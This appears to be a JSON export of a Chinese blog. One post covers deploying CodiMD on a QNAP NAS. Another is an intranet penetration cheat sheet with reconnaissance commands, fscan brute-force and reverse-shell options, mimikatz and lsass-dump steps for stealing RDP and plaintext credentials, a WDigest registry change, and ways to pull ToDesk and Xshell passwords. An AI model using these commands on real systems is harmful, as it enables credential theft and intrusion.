[{"content":"背景 事情的起因是想在NAS部署一套markdown编辑器，经过比对选中开源的CodiMD软件，CodiMD 是一款开源的、基于 Markdown 的协作笔记和文档编辑工具，专注于团队实时协作和知识共享。通过威联通NAS Docker部署好CodiMD软件后，发现现在威联通NAS 5.x的系统不支持在Container station管理界面增加修改CodiMD Docker的环境变量。\n一、CodiMD部署安装 1、通过直接在Container station应用中新建yml文件直接拉取镜像创建CodiMD应用\n# yml文件 version: \u0026#34;3\u0026#34; services: database: image: postgres:11.6-alpine environment: - POSTGRES_USER=codimd # 这里需要改成自己的密码 - POSTGRES_PASSWORD=change_password - POSTGRES_DB=codimd volumes: - \u0026#34;database-data:/var/lib/postgresql/data\u0026#34; restart: always codimd: image: hackmdio/hackmd:2.5.4 environment: # 这里需要改成自己的密码 - CMD_DB_URL=postgres://codimd:change_password@database/codimd - CMD_USECDN=false depends_on: - database ports: # 前面的端口是要映射到外部的端口，后面的端口是docker里面运行的端口，不想用3000端口可以更改前面的端口。 - \u0026#34;3000:3000\u0026#34; volumes: - upload-data:/home/hackmd/app/public/uploads restart: always volumes: database-data: {} upload-data: {} 2、现在就可以通过http://IP:3000端口访问CodiMD 3、现在CodiMD已经部署好了，但是在注册功能（点击登录按钮即可看到）是放开的，任何人都可以注册使用。若是个人使用或小团队使用，应在创建好账号后即刻关闭注册功能，确保安全性，但威联通nas不能在web管理界面修改增加环境变量（如下图），这就需要我们用其他的方法来进行修改。 二、Docker应用环境变量修改 1、配置ssh登录 首先要打开威联通的ssh连接访问，通过连到命令行进行来修改。 通过命令行或者shell工具连接到nas后台，然后输入Q回车，然后输入Y回车进入命令行\n# 命令行方式 ssh username@nas_ip 2、docker-compose安装 威联通nas本身不带docker-compose，可以通过以下命令来进行安装\nsudo curl -SL \u0026#34;https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/lib/docker-compose 3、查找docker目录 通过以下命令可以找到docker的目录 docker info | grep \u0026#39;Docker Root\u0026#39; 可以得到以下结果 /share/CACHEDEV1_DATA/Container/container-station-data/lib/docker 得到上一个目录后，可以往上级目录找可以找到CodiMD的目录 /share/CACHEDEV1_DATA/Container/container-station-data/application/codimd 进入到CodiMD的目录后可以看到有一个docker-compose.yml文件，通过vim docker-compose.yml打开，可以看到内容就是我们安装CodiMD的yml文件内容，然后通过修改docker-compose.yml增加环境变量，然后退出编辑并保存。 codimd: image: hackmdio/hackmd:2.5.4 environment: # 这里需要改成自己的密码 - CMD_DB_URL=postgres://codimd:change_password@database/codimd - CMD_USECDN=false # 以下增加的环境变量，可以参考官方文档根据需要来添加 # 禁止匿名访问 - CMD_ALLOW_ANONYMOUS=false # 禁止注册 - CMD_ALLOW_REGISTER=false # 禁止邮件注册 - CMD_ALLOW_EMAIL_REGISTER=false 4、更新配置并重启服务 docker-compose up -d --force-recreate codimd 5、 验证禁止注册配置生效 docker-compose exec codimd sh -c \u0026#39;echo $CMD_ALLOW_REGISTER\u0026#39; # 得到输出结果false 6、至此环境变量修改成功。 ","permalink":"https://hamor.top/posts/read/%E5%A8%81%E8%81%94%E9%80%9Anas-docker%E9%83%A8%E7%BD%B2codimd%E5%8F%8A%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%AE%E6%94%B9%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","summary":"\u003ch2 id=\"背景\"\u003e背景\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e事情的起因是想在NAS部署一套markdown编辑器，经过比对选中开源的CodiMD软件，CodiMD 是一款开源的、基于 Markdown 的协作笔记和文档编辑工具，专注于团队实时协作和知识共享。通过威联通NAS Docker部署好CodiMD软件后，发现现在威联通NAS 5.x的系统不支持在Container station管理界面增加修改CodiMD Docker的环境变量。\u003c/p\u003e","title":"威联通NAS Docker部署CodiMD及环境变量修改解决方案"},{"content":"内网信息收集 一、Windows常用命令 1、CMD信息收集 netstat -ano | findstr TCP #查看主机开放端口 tasklist /svc #查看主机运行进程 ipconfig /all #查看当前主机详细网络信息 systeminfo #查看操作系统信息和补丁 arp -a #查看arp缓存 net user #查看所有用户 route print #查看路由信息 schtasks #查看计划任务 query user #查看当前登录账户 net localgroup #查看本地用户组 net accounts #查看密码策略 net share #查看共享 net statistics workstation #查看主机开机时间 netsh advfirewall set allprofiles state off/on #开启和关闭防火墙 netsh advfirewall firewall show rule name=all #查看防火墙规则 cmdkey /l #查看当前保存的登录凭证 dir %APPDATA%\\Microsoft\\Windows\\Recent #查看最近打开得到文档 net start #查看当前启动的服务 #搜索后面文件里面的password findstr /si password config.* *.ini *.txt *.properties #信息收集ping for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr \u0026#34;TTL=\u0026#34; 2、wmic信息收集 wmic product list brie #查看当前主机详细网络信息 wmic service list brief #查看系统运行的服务 wmic process list brief #查看运行中的程序 wmic startup list brief #查看开机启动 wmic useraccount list brief #搜索用户账户 wmic qfe list brief #获取系统补丁 # 查看本机杀软 vmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 3、Windows下的一键信息收集 getsysteminfo.bat #批处理文件获取系统信息 getuserpass.bat #批处理文件获取账号密码 wmic_info.bat #批处理获取系统信息生成表格 注意：批处理下的变量使用两个百分号%%i Dos下的变量使用一个百分号 %i 二、linux常用命令 1、linux信息收集 ifconfig #查看当前主机详细网络信息 uname -a #查看操作系统信息主机名、系统名和内核 cat /etc/issue #查看系统名称 whoami #查看当前用户 cat /etc/passwd #查看当前用户权限 env #查看环境变量 history #查看历史命令 pwd #查看当前路径 arp -a #查看arp缓存 ps -aux #查看有哪些进程 netstat –anpt #查看开放的端口 route #查看路由信息 ls -la /etc/cron* #查看所有计划任务和配置文件 crontab –l #查看计划任务 cat /etc/crontab #查看计划任务 cat /etc/resolv.conf #查看dns服务信息 dpkg –l #查看安装了哪些包 who #查看登录用户 lastlog #查看登录日志 #查看xml文件中的password find . -name ‘*.xml’ -exec grep -i ‘password’ {} \\; -print #查看敏感文件 find / -type f -iname “*.bash_history” -o -iname “*config*” -o -iname “web.xml” -o -iname “*database*” -o -iname “*pass*” 2\u0026gt;/dev/null 三、内网信息收集工具 1、nmap -sS #半开放扫描。Nmap发送SYN包到远程主机，它不会产生任何会话.不需要通过完整的握手，就能获得远程主机的信息。因此不会在目标主机上产生任何日志记录，使用最频繁，安全，快 -sT #TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口 -O #检测操作系统、开放端口等等 -sA #用来穿过防火墙的规则集，检测哪些端口被屏蔽，速度慢。 -sV #扫描端口开放的服务及版本 -v #显示扫描的进程详细信息 -Pn #扫描之前不使用ping，适用于防火墙禁止ping -A #包含了-sV，-O，全面系统检测 -T #0-5 扫描速度，5位最高 -p #指定扫描端口 -sP #ping扫描（不进行端口扫描） -sU #UDP扫描,慢,可得到有价值的服务器程序 -iL　#扫描一个列表文件 -oN #输出结果 --open #只显示开启的端口 -F #快速扫描，减少端口 -sC #根据端口识别的服务,调用默认脚本 2、Masscan -p \u0026lt;ports,--ports \u0026lt;ports\u0026gt;\u0026gt; #指定端口进行扫描 --banners #获取banner信息，支持少量的协议 --rate \u0026lt;packets-per-second\u0026gt; #指定发包的速率 -c \u0026lt;filename\u0026gt;, --conf \u0026lt;filename\u0026gt; #读取配置文件进行扫描 --echo #将当前的配置重定向到一个配置文件中 -e \u0026lt;ifname\u0026gt; , --adapter \u0026lt;ifname\u0026gt; #指定用来发包的网卡接口名称 --adapter-ip \u0026lt;ip-address\u0026gt; #指定发包的IP地址 --adapter-port \u0026lt;port\u0026gt; #指定发包的源端口 --adapter-mac \u0026lt;mac-address\u0026gt; #指定发包的源MAC地址 --router-mac \u0026lt;mac address\u0026gt; #指定网关的MAC地址 --exclude \u0026lt;ip/range\u0026gt; #IP地址范围黑名单，防止masscan扫描 --excludefile \u0026lt;filename\u0026gt; #指定IP地址范围黑名单文件 --includefile，-iL \u0026lt;filename\u0026gt; #读取一个范围列表进行扫描 --ping #扫描应该包含ICMP回应请求 --append-output #以附加的形式输出到文件 --iflist #列出可用的网络接口，然后退出 --retries #发送重试的次数，以1秒为间隔 3、Fscan fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描) fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥) fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell) fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行) fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口) fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破) fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 ) fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞) fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块) fscan.exe -hf ip.txt (以文件导入) 四、内网凭证获取 1、DPAPI及它的两个API函数 从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。如果需要对某些数据进行加密或加密需要DPAPI提供的加密解密函数 对服务器密码（rdp凭证）的解密也需要用到Masterkey 2、DPAPI的作用范围 IE、Chrome的登录表单自动完成 Powershell加密函数 Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。 FTP管理账户密码 共享资源文件夹的访问密码 无线网络帐户密钥和密码 远程桌面身份凭证 EFS EAP/TLS 和 802.1x的身份凭证 Credential Manager中的数据 以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。 etc 3、Master Key/Master Key Files 存放密钥的文件则被称之为Master Key Files，其路径一般为： %APPDATA%/Microsoft/Protect/当前登录用户的SID 但是Master Key Files中存储的不是直接的密钥，而是将Master Key进行加密（随机64位字节码经过用户密码等信息）所存放的内容 Master Key和Master Key Files之间的关系其实就是， Master Key经过用户密码等信息加密后的内容才变成了Master Key Files中存储的内容 4、获取Master Key 注入lsass进程，从内存中读取Master Key，也可以dump lsass进程离线读 从注册表中获取（HKLM\\SYSTEM、HKLM\\SECURITY） 5、Windows RDP凭证获取 mimikatz解密\n1、 获取guid rdp 凭证路径%userprofile%\\AppData\\Local\\Microsoft\\Credentials* 2、对应guid获取master key 3、利用master key 进行解密\nguidMasterKey 每个用Master Key来进行加密的凭证信息，都是根据一个结构来进行生成的，而每个guidMasterKey就是对每个Master Key Files文件的标识符\n#查看mstsc的连接记录 管理员权限可以获取所有用户的key Cmdkey /list #Sid 获取 whoami /user #查看session id dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* #提升权限 mimikatz.exe \u0026#34;privilege::debug\u0026#34; #查看guidmasterkey dpapi::cred /in:C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Credentials\\{sessionid} #对应guid 查看masterkey mimikatz.exe sekurlsa::dpapi #对密码文件进行解密 mimikatz.exe \u0026#34;dpapi::cred /in:C:\\Users\\{username}\\appdata\\local\\microsoft\\credentials\\{session id} /masterkey:{masterkey}\u0026#34; 自动获取工具：https://github.com/GhostPack/SharpDPAPI 优势：使用can脚本自动读取masterkey guid 来解密密码，使用c#可以内存加载不落地执行 图形化工具Netpass： https://www.nirsoft.net/utils/network_password_recovery.html Windows server 2008明文密码获取 Mimikatz的使用 获取明文密码 mimikatz.exe \u0026#34;privilege::debug\u0026#34; mimikatz.exe sekurlsa::logonpasswords Windows server 2012明文密码获取 1、修改注册表 reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\ /v UseLogonCredential /t REG_DWORD /d 1 2、锁屏或者退出账号 %windir%\\System32\\rundll32.exe user32.dll,LockWorkStation (需要system权限) 3、等待目标系统管理员重新登录 4、读取密码 procdump64.exe -accepteula -ma lsass.exe lsass.dmp Mimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full Xshell和xftp密码获取 1、在线解密 SharpDecryptPwd https://github.com/uknowsec/SharpDecryptPwd Usage: SharpDecryptPwd.exe -NavicatCrypto SharpDecryptPwd.exe -TeamViewer SharpDecryptPwd.exe -FileZilla SharpDecryptPwd.exe -WinSCP SharpDecryptPwd.exe -Xmangager -p Session_Path –s sid 2、离线解密 how-does-Xmanager-encrypt-password 地址：https://github.com/HyperSine/how-does-Xmanager-encrypt-password 注意：xshell6.0以上要做sid认证 使用whoami /user 查看后sid进行离线解密,这里有个坑，安装pycryptodome记得修改\\Lib\\site-packages下的crypto把c改成大写不然会报没有这个库。 Todesk 凭证获取 从C:\\Program Files (x86)\\ToDesk\\userInfo.json中获取USERID和PassEx，替换C:\\Program Files (x86)\\ToDesk\\config.ini中的tempAuthPassEx，重新打开todesk就可以看到对方明文密码。\nFirefox https://github.com/unode/firefox_decrypt\n综合利用工具LaZagne： https://github.com/AlessandroZ/LaZagne laZagne.exe all laZagne.exe browsers laZagne.exe browsers -firefox ","permalink":"https://hamor.top/posts/tech/%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/","summary":"\u003ch2 id=\"内网信息收集\"\u003e内网信息收集\u003c/h2\u003e\n\u003ch3 id=\"一windows常用命令\"\u003e一、Windows常用命令\u003c/h3\u003e\n\u003ch4 id=\"1cmd信息收集\"\u003e1、CMD信息收集\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetstat -ano | findstr TCP                        \u003cspan style=\"color:#75715e\"\u003e#查看主机开放端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etasklist /svc                                     \u003cspan style=\"color:#75715e\"\u003e#查看主机运行进程\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eipconfig /all                                     \u003cspan style=\"color:#75715e\"\u003e#查看当前主机详细网络信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysteminfo                                        \u003cspan style=\"color:#75715e\"\u003e#查看操作系统信息和补丁\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003earp -a                                            \u003cspan style=\"color:#75715e\"\u003e#查看arp缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet user                                          \u003cspan style=\"color:#75715e\"\u003e#查看所有用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroute print                                       \u003cspan style=\"color:#75715e\"\u003e#查看路由信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eschtasks                                          \u003cspan style=\"color:#75715e\"\u003e#查看计划任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003equery user                                        \u003cspan style=\"color:#75715e\"\u003e#查看当前登录账户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet localgroup                                    \u003cspan style=\"color:#75715e\"\u003e#查看本地用户组\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet accounts                                      \u003cspan style=\"color:#75715e\"\u003e#查看密码策略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet share                                         \u003cspan style=\"color:#75715e\"\u003e#查看共享\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet statistics workstation                        \u003cspan style=\"color:#75715e\"\u003e#查看主机开机时间\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetsh advfirewall set allprofiles state off/on    \u003cspan style=\"color:#75715e\"\u003e#开启和关闭防火墙\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetsh advfirewall firewall show rule name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eall     \u003cspan style=\"color:#75715e\"\u003e#查看防火墙规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecmdkey /l                                         \u003cspan style=\"color:#75715e\"\u003e#查看当前保存的登录凭证\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edir %APPDATA%\u003cspan style=\"color:#ae81ff\"\u003e\\M\u003c/span\u003eicrosoft\u003cspan style=\"color:#ae81ff\"\u003e\\W\u003c/span\u003eindows\u003cspan style=\"color:#ae81ff\"\u003e\\R\u003c/span\u003eecent            \u003cspan style=\"color:#75715e\"\u003e#查看最近打开得到文档\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet start                                         \u003cspan style=\"color:#75715e\"\u003e#查看当前启动的服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#搜索后面文件里面的password\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efindstr /si password  config.*  *.ini *.txt *.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#信息收集ping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e /L %I in \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e1,1,254\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e DO @ping -w \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e -n \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e 192.168.3.%I | findstr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;TTL=\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"2wmic信息收集\"\u003e2、wmic信息收集\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic product list brie                            \u003cspan style=\"color:#75715e\"\u003e#查看当前主机详细网络信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic service list brief                           \u003cspan style=\"color:#75715e\"\u003e#查看系统运行的服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic process list brief                           \u003cspan style=\"color:#75715e\"\u003e#查看运行中的程序\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic startup list brief                           \u003cspan style=\"color:#75715e\"\u003e#查看开机启动\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic useraccount list brief                       \u003cspan style=\"color:#75715e\"\u003e#搜索用户账户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic qfe list brief                               \u003cspan style=\"color:#75715e\"\u003e#获取系统补丁\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看本机杀软\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evmic /Node:localhost /Namespace:\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003eroot\u003cspan style=\"color:#ae81ff\"\u003e\\S\u003c/span\u003eecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"3windows下的一键信息收集\"\u003e3、Windows下的一键信息收集\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egetsysteminfo.bat                                 \u003cspan style=\"color:#75715e\"\u003e#批处理文件获取系统信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egetuserpass.bat                                   \u003cspan style=\"color:#75715e\"\u003e#批处理文件获取账号密码\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewmic_info.bat                                     \u003cspan style=\"color:#75715e\"\u003e#批处理获取系统信息生成表格\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e注意：批处理下的变量使用两个百分号%%i\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDos下的变量使用一个百分号 %i\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"二linux常用命令\"\u003e二、linux常用命令\u003c/h3\u003e\n\u003ch4 id=\"1linux信息收集\"\u003e1、linux信息收集\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eifconfig                                          \u003cspan style=\"color:#75715e\"\u003e#查看当前主机详细网络信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003euname -a                                          \u003cspan style=\"color:#75715e\"\u003e#查看操作系统信息主机名、系统名和内核\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat /etc/issue                                    \u003cspan style=\"color:#75715e\"\u003e#查看系统名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhoami                                            \u003cspan style=\"color:#75715e\"\u003e#查看当前用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat /etc/passwd                                   \u003cspan style=\"color:#75715e\"\u003e#查看当前用户权限 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenv                                               \u003cspan style=\"color:#75715e\"\u003e#查看环境变量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehistory                                           \u003cspan style=\"color:#75715e\"\u003e#查看历史命令\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epwd                                               \u003cspan style=\"color:#75715e\"\u003e#查看当前路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003earp -a                                            \u003cspan style=\"color:#75715e\"\u003e#查看arp缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eps -aux                                           \u003cspan style=\"color:#75715e\"\u003e#查看有哪些进程\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetstat –anpt                                     \u003cspan style=\"color:#75715e\"\u003e#查看开放的端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroute                                             \u003cspan style=\"color:#75715e\"\u003e#查看路由信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -la /etc/cron*                                 \u003cspan style=\"color:#75715e\"\u003e#查看所有计划任务和配置文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecrontab –l                                        \u003cspan style=\"color:#75715e\"\u003e#查看计划任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat /etc/crontab                                  \u003cspan style=\"color:#75715e\"\u003e#查看计划任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat /etc/resolv.conf                              \u003cspan style=\"color:#75715e\"\u003e#查看dns服务信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edpkg –l                                           \u003cspan style=\"color:#75715e\"\u003e#查看安装了哪些包\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewho                                               \u003cspan style=\"color:#75715e\"\u003e#查看登录用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elastlog                                           \u003cspan style=\"color:#75715e\"\u003e#查看登录日志\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#查看xml文件中的password\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efind . -name ‘*.xml’ -exec grep -i ‘password’ \u003cspan style=\"color:#f92672\"\u003e{}\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\;\u003c/span\u003e -print\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#查看敏感文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efind / -type f -iname “*.bash_history” -o -iname “*config*” -o -iname “web.xml” -o -iname “*database*” -o -iname “*pass*” 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"三内网信息收集工具\"\u003e三、内网信息收集工具\u003c/h3\u003e\n\u003ch4 id=\"1nmap\"\u003e1、\u003ca href=\"https://nmap.org/download.html\"\u003enmap\u003c/a\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-sS          \u003cspan 